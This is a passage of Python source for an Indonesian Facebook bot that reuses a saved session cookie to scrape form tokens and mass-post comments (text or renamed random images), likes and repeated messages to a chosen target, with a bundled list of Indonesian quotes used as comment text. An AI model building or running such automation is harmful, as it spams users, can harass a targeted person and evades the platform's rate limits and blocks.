                Console(width=50).print(panel('[bold red]Gagal Membuat Postingan',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
                input('   └─> ');menu()
            else:
                Console(width=50).print(panel('[bold green]Berhasil Membuat Postingan',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
                input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
        input('   └─> ');menu()

def menu_komen():
    Console(width=50).print(panel('''[bold green][[bold white]01[bold green]].[bold white]Komentar Text
[bold green][[bold white]02[bold green]].[bold white]Komentar Bergambar (Random)
[bold green][[bold white]03[bold green]].[bold red]Kembali''',width=50,style='bold white',subtitle='┌',subtitle_align='left'))
    choice = input('   └─> ')
    if choice in ['1','01']:
        komen_text()
    elif choice in ['2','02']:
        komen_image()
    elif choice in ['3','03']:
        menu()
    else:print('   └─> [bold red]Pilih Yang Benar');sleep(2);menu()

def komen_text():
    coment = []
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan URL Postingan',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    link = input('   └─> ')
    Console(width=50).print(panel('Komentar Manual/Random : M/R',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    my = input('   └─> ').lower()
    if my in ['m','manual','1','01']:
        Console(width=50).print(panel('Masukan Text Komentar, Gunakan "<>" Sebagai Split',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
        ran = input('   └─> ').split('<>')
        textf = coment.append(ran)
        text1 = random.choice(coment)
    else:
        kom = sorted(open('.Assets/Text.txt','r').read().split('<=>'))
        for komenbot in kom:
            jam = strftime('%T')
            tkom = gbg+f' {jam} WIB'
            textf = coment.append(f'{komenbot}')
        text1 = coment
    Console(width=50).print(panel('Masukan Jumlah',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    jum = int(input('   └─> '))
    Console(width=50).print(panel('Masukan Delay',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    dly = int(input('   └─> '))
    ok,cp = 0,0
    Console(width=50).print(panel('Mengirim Komenter',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    for yy in range(jum):
        try:
            with requests.Session() as r:
                text = random.choice(text1)
                url = link.replace('www.facebook','free.facebook').replace('web.facebook','free.facebook').replace('free.facebook','free.facebook').replace('m.facebook','free.facebook')
                response = bs(r.get(url,cookies=cookie).content,'html.parser')
                raq = response.find('form',{'method':'post'})
                dat = {
                    'fb_dtsg'         : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                    'jazoest'         : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                    'comment_text'    : text,
                }
                pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies=cookie).content,'html.parser')
                cek = pos.find('title').text
                if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                    cp+=1
                else:
                    ok+=1
        except Exception as e:
            cp+=1
        except KeyboardInterrupt:
            print('')
            Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
            input('   └─> ');menu()
        print(f'   └─> Success : [bold green]{ok}[bold white]|Failed : [bold red]{cp}',end='\r');sleep(dly)
    print('')
    Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
    input('   └─> ');menu()

def komen_image():
    coment = []
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan URL Postingan',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    link = input('   └─> ')
    Console(width=50).print(panel('Text Komentar Manual/Random/None : M/R/N',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    my = input('   └─> ').lower()
    if my in ['m','manual','1','01']:
        Console(width=50).print(panel('Masukan Text Komentar, Gunakan "<>" Sebagai Split',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
        ran = input('   └─> ').split('<>')
        textf = coment.append(ran)
        text1 = random.choice(coment)
    elif my in ['n','none','3']:
        text1 = [' ',' ']
    else:
        kom = sorted(open('.Assets/Text.txt','r').read().split('<=>'))
        for komenbot in kom:
            jam = strftime('%T')
            tkom = gbg+f' {jam} WIB'
            textf = coment.append(komenbot)
        text1 = coment
    Console(width=50).print(panel('Masukan Jumlah',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    jumlahkom = int(input('   └─> '))
    Console(width=50).print(panel('Masukan Delay',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    dly = int(input('   └─> '))
    ua="Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36"
    dir1 = ['Image1','Image2']
    for dir in dir1:
        var = os.listdir(f'.Pictures/{dir}')
        for isi in var:
            nama,form = isi.split('.')
            image = open(f'.Pictures/{dir}/{isi}','rb').read()
            up = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
            lw = up.lower()
            nb = '0123456789'
            ch = up + lw + nb + nb
            jum = random.choice([12,13,14,15,10,11,16,17])
            res = ''.join(random.choice(ch) for _ in range(19))
            jam = strftime('%T').replace(':','')
            names = f'{res}{jam}.'
            open(f'.Pictures/{dir}/{names}{form}','wb').write(image)
            os.remove(f'.Pictures/{dir}/{isi}')
    lizz = random.choice(dir1)
    var = os.listdir(f'.Pictures/{lizz}/')
    Console(width=50).print(panel('Tekan "Ctrl + C" Untuk Berhenti',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    with requests.Session() as r:
        ok,cp=0,0
        for mlll in range(jumlahkom):
            isi = random.choice(var)
            jam = strftime('%T')
            tkom = gbg+f' {jam} WIB'
            ni = isi
            url = link.replace('www.facebook','free.facebook').replace('web.facebook','free.facebook').replace('free.facebook','free.facebook').replace('m.facebook','free.facebook')
            img = open(f'.Pictures/{lizz}/{ni}','rb')
            if "png" in ni.split(".")[1]:
                ty="image/png"
            else:
                ty="image/jpeg"
            text = random.choice(text1)
            try:
                if type(text) == list:
                    text=random.choice(text)
                else:
                    text=text
                req=bs(r.get(url,cookies=cookie).text,"html.parser").find_all("form",action=lambda x: "comment.php" in x)[1]
                dt=req.find_all("input")
                params={}
                for x in dt:
                    if x.get("name") in ["fb_dtsg","jazoest","view_photo"]:
                        params.update({x.get("name"):x.get("value")})
                    else:
                        continue
                res1=bs(r.post('https://free.facebook.com'+req["action"],data=params,cookies=cookie).content,"html.parser")
                res = res1.find("form",action=lambda x: "https://z-upload.facebook.com/_mupload_/ufi/mbasic/advanced/" in x)
                dt2=res.find_all("input")
                fg=dt2[0]["value"]
                jz=dt2[1]["value"]
                sb=dt2[4]["value"]
                boundary = '----WebKitFormBoundary' \
                        + ''.join(random.sample(string.ascii_letters + string.digits, 16))
                mp=MultipartEncoder(fields={"fb_dtsg":(None,fg),"jazoest":(None,jz),"photo":(ni,img,ty),"comment_text":(None,text),"post":(None,sb)},boundary=boundary)
                head={"Host":"z-upload.facebook.com","cache-control":"max-age=0","origin":"https://free.facebook.com","upgrade-insecure-requests":"1","content-type":mp.content_type,"user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":freefb.format(req["action"]),"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                pos = bs(r.post(res["action"],data=mp,headers=head,cookies=cookie,allow_redirects=False).content,'html.parser')
                cek = res1.find('title').text
                if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' or cek == 'Anda Tidak Dapat Berkomentar Saat Ini' :
                    cp+=1
                else:
                    ok+=1
            except Exception as e:
                cp+=1
            except KeyboardInterrupt:
                print('')
                Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
                input('   └─> ');menu()
            try:print(f'   └─> Success : [bold green]{ok}[bold white]|Failed : [bold red]{cp}[bold white]|Total : [bold blue]{jumlahkom}       ',end='\r');sleep(dly)
            except KeyboardInterrupt:
                print('')
                Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
                input('   └─> ');menu()
        print('')
        Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
        input('   └─> ');menu()

def bot_share():
    print('')

def like_post():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan URL Postingan',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    link = input('   └─> ').replace('www.facebook','free.facebook').replace('web.facebook','free.facebook').replace('free.facebook','free.facebook').replace('m.facebook','free.facebook').split(',')
    try:
        with requests.Session() as r:
            for url in link:
                for foll in bs(r.get(url,cookies=cookie).text,'html.parser').find_all('a',href=True):
                    if '/a/like.php?' in foll.get('href'):
                        pos = bs(r.get('https://free.facebook.com'+foll['href'],cookies=cookie).content,'html.parser')
                        cek = pos.find('title').text
                        if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                            Console(width=50).print(panel('[bold red]Gagal Like Postingan',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
                            input('   └─> ');menu()
                        else:
                            Console(width=50).print(panel('[bold green]Berhasil Like Postingan',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
                            input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Error [bold cyan]<[bold green]<[bold yellow]<'),justify='center');exit()

def message():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan ID Target',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    user = input('   └─> ')
    Console(width=50).print(panel('Masukan Jumlah Pesan',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    jumlah = int(input('   └─> '))
    Console(width=50).print(panel('Masukan Delay',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    dly = int(input('   └─> '))
    url11 = f'https://free.facebook.com/messages/read/?tid={user}'
    aw = bs(requests.get(url11,cookies=cookie).content,'html.parser')
    judaw = aw.find('title').text
    if judaw == 'Pesan Baru':
        chat = []
        url = f'https://free.facebook.com/profile.php?id={user}'
        Console(width=50).print(panel('Masukan Text, Gunakan "<>" Sebagai Split',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
        ran = input('   └─> ').split('<>')
        textf = chat.append(ran)
        text1 = random.choice(chat)
        ok,cp=0,0
        Console(width=50).print(panel('Sedang Mengirimkan Pesan',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
        for nanna in range(jumlah):
            try:
                with requests.Session() as r:
                    text = random.choice(text1)
                    req = bs(r.get(url,cookies=cookie).content,'html.parser')
                    nama = req.find('title').text
                    url1 = re.search('href="/messages/thread/(.*?)"',str(req))[1]
                    lanjut = bs(r.get(f'https://free.facebook.com/messages/thread/{url1}',cookies=cookie).content,'html.parser')
                    fom = lanjut.find('form',{'method':'post'})
                    datax = fom.find_all("input",type="hidden")
                    jum = len(datax)
                    if not "&refid=" in fom["action"]:
                        fg=datax[0]["value"]
                        jz=datax[1]["value"]
                        ids=datax[2]["value"]
                        tids=datax[3]["value"]
                        params={"fb_dtsg":fg,"jazoest":jz,"ids["+ids+"]":ids,"text_ids["+ids+"]":tids,"body":text,"Send":"Kirim"}
                    else:
                        fg=datax[0]["value"]
                        jz=datax[1]["value"]
                        tids=datax[2]["value"]
                        wup=datax[3]["value"]
                        ids=datax[4]["value"]
                        cv=datax[8]["value"]
                        cs=datax[9]["value"]
                        params={
                            "fb_dtsg":fg,
                            "jazoest":jz,
                            "body":text,
                            "send":"Kirim",
                            "tids":tids,
                            "wwwupp":wup,
                            "ids["+ids+"]":ids,
                            "referrer":"",
                            "ctype":"",
                            "cver":cv,
                            "csid":cs
                        }
                    pos = bs(r.post(f"https://free.facebook.com{fom['action']}",data=params,cookies=cookie).content,'html.parser')
                    cek = pos.find('title').text
                    if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' or cek == 'Anda Tidak Dapat Berkomentar Saat Ini' :
                        cp+=1
                    else:
                        ok+=1
            except Exception as e:
                cp+=1
            except KeyboardInterrupt:
                print('')
                Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
                input('   └─> ');menu()
            print(f'   └─> Success : [bold green]{ok}[bold white]|Failed : [bold red]{cp}',end='\r');sleep(dly)
        print('')
        Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
        input('   └─> ');menu()
    else:
        chat = []
        url = f'https://free.facebook.com/messages/read/?tid={user}'
        Console(width=50).print(panel('Masukan Text, Gunakan "<>" Sebagai Split',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
        ran = input('   └─> ').split('<>')
        textf = chat.append(ran)
        text1 = random.choice(chat)
        ok,cp=0,0
        Console(width=50).print(panel('Sedang Mengirimkan Pesan',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
        for nanna in range(jumlah):
            try:
                with requests.Session() as r:
                    text = random.choice(text1)
                    req = bs(r.get(url,cookies=cookie).content,'html.parser')
                    nama = req.find('title').text
                    req = bs(r.get(url,cookies=cookie).content,'html.parser')
                    nama = req.find('title').text
                    fom = req.find('form',{'method':'post'})
                    datax = fom.find_all("input",type="hidden")
                    if not "&refid=" in fom["action"]:
                        fg=datax[0]["value"]
                        jz=datax[1]["value"]
                        ids=datax[2]["value"]
                        tids=datax[3]["value"]
                        params={"fb_dtsg":fg,"jazoest":jz,"ids["+ids+"]":ids,"text_ids["+ids+"]":tids,"body":text,"Send":"Kirim"}
                    else:
                        fg=datax[0]["value"]
                        jz=datax[1]["value"]
                        tids=datax[2]["value"]
                        wup=datax[3]["value"]
                        ids=datax[4]["value"]
                        cv=datax[8]["value"]
                        cs=datax[9]["value"]
                        params={
                            "fb_dtsg":fg,
                            "jazoest":jz,
                            "body":text,
                            "send":"Kirim",
                            "tids":tids,
                            "wwwupp":wup,
                            "ids["+ids+"]":ids,
                            "referrer":"",
                            "ctype":"",
                            "cver":cv,
                            "csid":cs
                        }
                    pos = bs(r.post(f"https://free.facebook.com{fom['action']}",data=params,cookies=cookie).content,'html.parser')
                    cek = pos.find('title').text
                    if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' or cek == 'Anda Tidak Dapat Berkomentar Saat Ini' :
                        cp+=1
                    else:
                        ok+=1
            except Exception as e:
                cp+=1
            except KeyboardInterrupt:
                print('')
                Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
                input('   └─> ');menu()
            print(f'   └─> Success : [bold green]{ok}[bold white]|Failed : [bold red]{cp}',end='\r');sleep(dly)
        print('')
        Console(width=50).print(panel('[bold green]Selesai',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
        input('   └─> ');menu()

textkomen = ("""Jangan berharap masalahmu akan dimudahkan, namun berharaplah kamu akan jadi orang yang lebih kuat.<=>
Ketika kamu merasa kehilangan harapan, ingat bahwa Tuhan telah menciptakan rencana terindah untuk hidup kita.<=>
Tidak ada istilah gagal dalam hidup, yang ada hanya sukses dan belum berhasil. Jangan menyerah!<=>
Ingatlah bahwa tak ada yang abadi di dunia ini, termasuk masalah yang ada dalam hidupmu.<=>
Tidak ada kata gagal dalam hidup ini, kecuali saat kamu menyerah menghadapi cobaan.<=>
Jika untuk bermimpi saja kamu takut, maka kamu adalah orang yang tidak tahu arah masa depanmu.<=>
Jika kamu hanya bertahan di zona nyaman, maka kamu tak akan pernah tahu banyak hal.<=> Jangan takut mencoba!
Masa depan adalah milik mereka yang percaya dengan impiannya.<=>
“Kau menghancurkan harapanku dengan gambaran yang kau simpan.”<=>
“Kecewa merajalela, seperti angin yang merobek hatiku.”<=>
"Kau bukan lagi tempat perlindungan, melainkan sumber mengecewakanku."<=>
"Raut wajahmu jadi cermin kecewa yang sulit kusembunyikan."<=>
"Janji palsumu meninggalkan rasa kecewa yang mendalam."<=>
"Aku terluka oleh ketidaksetiaan yang kau sembunyikan."<=>
"Rasa kecewa itu seperti bayangan yang tak pernah hilang."<=>
"Cinta yang kau janjikan, kini hanya sisa kecewa."<=>
Bermimpi bukanlah sesuatu yang menyeramkan.<=>
Tidak ada yang mustahil di dunia ini jika kamu percaya<=>.
Ada dua tipe orang di dunia ini. Mereka yang mempunyai mimpi besar, dan mereka yang bangun untuk mewujudkannya.<=>
Saat kamu ingin kembali ke masa lalu, syukurilah hal-hal baik yang kamu punya saat ini.<=>
Fokus dengan masa depan memang baik, namun jangan sampai kamu sia-siakan momen bahagia di hari ini.<=>
Seburuk apapun masa lalumu, itu telah berlalu. Sekarang, fokus untuk kebahagiaan dirimu di masa depan.<=>
Jangan kutuk dirimu atas kesalahan yang kamu buat di masa lalu, jadikan sebagai pelajaran dan berusaha hidup lebih baik.<=>
Jadikan kegagalanmu sebagai batu loncatan untuk bisa menggapai hal yang lebih tinggi.<=>
Kehidupan yang bermakna adalah dambaan setiap insan. Tentunya kehidupan tersebut melalui beragam peristiwa baik suka maupun duka. Bagi yang mampu menjalaninya dengan baik tentu akan menemukan makna hidupnya.<=>
Perbaikilah dirimu, maka orang akan memaafkanmu dengan sendirinya.<=>
Kita selalu bisa memaafkan, namun tidak harus melupakan.<=>
Sebelum meminta maaf pada orang lain, cobalah memaafkan dirimu sendiri.<=>
Mengucapkan maaf memang terasa mudah, tapi sangat sulit dilakukan.<=>
Meminta maaf bukan berarti salah, itu adalah pertanda sudah dewasa.<=>
Berani mengambil risiko, kamu akan menang, kamu akan senang!
Walaupun orang lain jahat kepadamu, namun kamu harus tetap baik pada dirimu sendiri.<=>
Mencintai diri adalah sumber dari segala jenis cinta yang lain.<=>
Cintailah orang yang kamu lihat di depan cermin.<=>
Walaupun tidak sempurna, namun kamu cantik dengan caramu sendiri<=>
Setiap cobaan yg datang adalah proses pendewasaan diri.<=>
Setiap permasalahan adalah pelajaran berharga.<=>
Hidup adalah tentang belajar. Jika berhenti, kamu akan mati.<=>
Jangan pernah merasa gagal saat belajar, itu adalah bagian dari proses.<=>
Rajinlah belajar saat masih muda agar tak miskin ilmu di hari tua.<=>
Sejauh apapun kamu pergi, keluarga adalah tempatmu kembali.<=>
Orang yang pantas kamu bahagiakan terlebih dahulu adalah keluargamu.
Keluarga lebih erat hubungannya dari ikatan darah dan bisa kamu temukan dimana saja.<=>
Saat kamu sukses, maka orang yang paling pertama tersenyum adalah orangtua.<=>
Pengalaman memang membawamu pada kesuksesan, tapi keluar akan mengajarkan soal makna kehidupan.<=>
Tak ada waktu untuk mengeluh. Bangun sekarang dan hadapilah segala masalah!<=>
Mimpi akan jadi kenyataan jika kita punya keberanian.<=>
Fokuslah pada hal-hal yang bisa kamu kontrol, selebihnya bukanlah urusanmu.<=>
Saat kita punya harapan, maka kita akan fokus mencapai tujuan hidup<=>
Saat kamu memutuskan untuk bangun dari tidur, artinya kamu siap untuk menjalani hidup.<=>
Tidak ada orang yang bisa membuatmu merasa rendah tanpa persetujuanmu.<=>
Dalam menjalani hidup, jadilah orang yang kuat dan bermartabat.<=>
Harga diri bukan berarti gila hormat, namun suatu kesadaran bahwa kita berhak memilikinya.<=>
Kamu berharga dan punya nilai, jangan biarkan orang lain menjatuhkanmu.<=>
Harga diri tidak dapat dibeli atau dibuat, melainkan harta yang sudah kamu miliki sejak lahir. Jadi jagalah baik-baik!<=>
Senyuman adalah simbol persahabatan dan kedamaian.<=>
Hidup itu ibarat cermin. Jika kamu menghadapinya dengan senyuman, maka hidup akan tersenyum kembali padamu.<=>
Dari semua obat di dunia ini, senyum adalah penyembuh terbaik.<=>
Tersenyumlah pada siapapun, siapa tahu kamu dapat mengobati hati yang sedang sedih.<=>
Percayalah bahwa kamu adalah alasan seseorang untuk tersenyum.<=>
Jangan mengikuti tren. Kamulah yang memutuskan siapa kamu.<=>
Ciptakan gayamu sendiri. Jadikan itu unik namun tetap dapat dikenali oleh orang lain.<=>
Aku bukan wanita yang harga dirinya dilihat dari ukuran bajunya.<=>
Kecerdasan tidak menarik jika tak dikombinasikan dengan keanggunan.<=>
Jadilah versi terbaik dari dirimu sendiri, bukan versi terbaik dari orang lain.".<=>
Kamu tidak akan pernah mencapai sukses kecuali jika kamu menyukai apa yang kamu lakukan.<=>
Kamu tidak harus hebat saat memulai, tapi kamu harus memulai untuk menjadi hebat.<=>
Fokuslah pada hal-hal yang ingin kamu tuju, bukan yang kamu takuti.<=>
Tindakan adalah kunci dari semua kesuksesan..<=>
“Tersakiti oleh keputusan-keputusanmu yang menyakitkan.”<=>
“Hati ini lelah menanggung beban rasa kecewa yang terus tumbuh.”<=>
“Senyummu bukan lagi obat, melainkan sumber yang mengecewakan.”<=>
"Kecewa seperti luka yang sulit sembuh di dalam hati."<=>
"Rasa kecewa membeku dalam dinginnya ketidakpedulianmu."<=>
"Kau buat janji manis, tapi rasa kecewa yang kuterima."<=>
"Cinta yang dulu hangat, kini tenggelam dalam samudra kecewa."<=>
"Kecewa karena kau tak lagi menjadi tempatku pulang."<=>
“Kau menghancurkan kepercayaanku, meninggalkan jejak kecewa.”<=>
"Dalam senyumanmu, terselip rahasia kecewa yang tak terungkap."<=>
“Hatiku terluka, dan kecewa membentuk lanskap yang sepi.”<=>
Satu-satunya cara untuk memulaI adalah berhenti bicara dan mulai kerjakan..<=>
Kamu harus merasakan kesulitan terlebih dulu sebelum kebahagiaan yang sempurna datang padamu.<=>
Dalam menghadapi musuh, hadapilah dengan senjata kasih sayang.<=>
Jadikan pengalaman masa lalu sebagai tonggak petunjuk, bukan tonggak belenggu.<=>
Hidup bukanlah tentang 'Aku Bisa', namun juga tentang 'Aku Mencoba'.<=>
Secepat apapun kebohongan, kebenaran pasti akan mengejarnya.<=>
Kita tidak dapat memecahkan masalah dengan jenis pemikiran yang kita gunakan ketika kita memikirkannya.<=>
Belajarlah seolah-olah kamu akan hidup selamanya, hiduplah seolah-olah kamu akan mati besok.<=>
Jauhi orang-orang yang mencoba meremehkan ambisimu. Pikiran kecil akan selalu melakukan itu, tetapi pikiran besar akan memberi kamu perasaan bahwa kamu juga bisa menjadi hebat.<=>
Ketika kamu memberikan kegembiraan kepada orang lain, kamu mendapatkan lebih banyak kegembiraan sebagai balasannya. Kamu perlu memikirkan baik-baik kebahagiaan yang dapat kamu berikan.<=>
Ketika kamu mengubah pikiran, ingatlah untuk juga mengubah dunia kamu.<=>
Hanya ketika kita mengambil risiko, hidup kita membaik. Risiko awal dan tersulit yang perlu kita ambil adalah bersikap jujur.<=>
Alam telah memberi kita semua bagian yang diperlukan untuk mencapai kesuksesan kebugaran dan kesehatan yang luar biasa, tetapi menyerahkannya kepada kita untuk menyatukan bagian-bagian ini.<=>
Sukses bukanlah akhir, kegagalan bukanlah hal yang fatal, keberanian untuk melanjutkan yang terpenting.<=>
Jalan menuju sukses dan jalan menuju kegagalan hampir sama persis.<=>
Sukses biasanya datang kepada mereka yang terlalu sibuk mencarinya.<=>
Kembangkan kesuksesan dari kegagalan. Keputusasaan dan kegagalan adalah dua batu loncatan paling pasti menuju kesuksesan.<=>
Ada tiga cara menuju kesuksesan tertinggi. Pertama adalah bersikap baik. Kedua adalah bersikap baik. Ketiga adalah bersikap baik.<=>
Saya tidak pernah bermimpi tentang kesuksesan. Saya bekerja untuk itu.<=>
Sukses adalah mendapatkan apa yang kamu inginkan, kebahagiaan adalah menginginkan apa yang kamu dapatkan.<=>
Orang pesimis melihat kesulitan di setiap kesempatan. Orang yang optimis melihat peluang dalam setiap kesulitan.<=>
Jika kamu sedang mengerjakan sesuatu yang benar-benar kamu pedulikan, kamu tidak perlu didorong.<=>
Pengalaman adalah guru yang keras karena dia memberikan ujian terlebih dahulu. Pelajarannya setelahnya.<=>
Penetapan tujuan adalah rahasia menuju masa depan yang meyakinkan.<=>
Saya lebih percaya pada keberuntungan dan saya menemukan semakin keras saya bekerja, semakin saya memiliki semuanya.<=>
Ketika kita berusaha untuk menjadi lebih baik dari kita, segala sesuatu di sekitar kita juga menjadi lebih baik.<=>
"Setiap kesulitan adalah peluang untuk tumbuh dan belajar."<=>
"Keberanian mengubah impian menjadi kenyataan."<=>
"Optimisme adalah kunci menuju pintu keberhasilan."<=>
"Hidup adalah perjalanan, bukan tujuan akhir."<=>
"Kesuksesan bermula dari tekad yang kuat."<=>
"Jangan takut gagal, tapi takutlah untuk tidak mencoba."<=>
"Ketekunan adalah kunci meraih impian tertinggi."<=>
"Teruslah bergerak maju, bahkan jika hanya langkah kecil."<=>
"Hidup penuh makna ketika kita memberi makna pada hidup orang lain."<=>
"Keberhasilan bukan akhir perjalanan, tetapi perjalanan yang berkelanjutan."<=>
"Pilihlah kebahagiaan setiap hari, bukan hanya pada akhir perjalanan."<=>
"Ketika satu pintu tertutup, pintu lain akan terbuka."<=>
"Jadilah perubahan yang ingin kamu lihat dalam dunia."<=>
"Bermimpilah besar dan berani mengejar mimpi-mimpi itu."<=>
"Hidup tanpa penyesalan adalah kehidupan yang false."<=>
“Rasa kecewa menghantui hatiku setiap kali memikirkanmu.”<=>""")

if __name__ in ['__main__']:
    os.system('git pull')
    try:os.mkdir('Data')
    except:pass
    try:os.mkdir('.Assets')
    except:pass
    try:
        text = open('.Assets/Text.txt','r').read()
    except FileNotFoundError:open(f'.Assets/Text.txt','w').write(textkomen)
    baner()
    try:
        cookie = open('Data/Cookie.txt','r').read()
        nama = myname(cookie)
    except FileNotFoundError:login_cookie()
    try:comentss(cookie);menu()
    except Exception as e:print(e)
